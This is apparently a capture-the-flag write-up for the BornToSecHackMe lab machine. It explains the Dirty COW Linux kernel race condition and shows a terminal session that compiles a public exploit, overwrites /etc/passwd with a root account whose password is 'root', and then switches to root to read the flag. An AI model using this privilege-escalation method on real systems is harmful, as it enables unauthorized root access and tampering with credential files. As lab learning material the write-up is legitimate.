# Dirty Cow exploit

see https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs

After login with one of the users that we got in the first writeup, we can run the dirty cow exploit.

A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.

After wegot the source code of the exploit from https://github.com/FireFart/dirtycow/blob/master/dirty.c :

```bash
laurie@BornToSecHackMe:~$ vi dirty.c
laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
laurie@BornToSecHackMe:~$ ./dirty root
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: root
Complete line:
root:roK20XGbWEsSM:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'root'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'root'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
laurie@BornToSecHackMe:~$ su root
Password:
root@BornToSecHackMe:/home/laurie# cd
root@BornToSecHackMe:~# ls
README
root@BornToSecHackMe:~# pwd
/root
root@BornToSecHackMe:~# cat README
CONGRATULATIONS !!!!
To be continued...
```
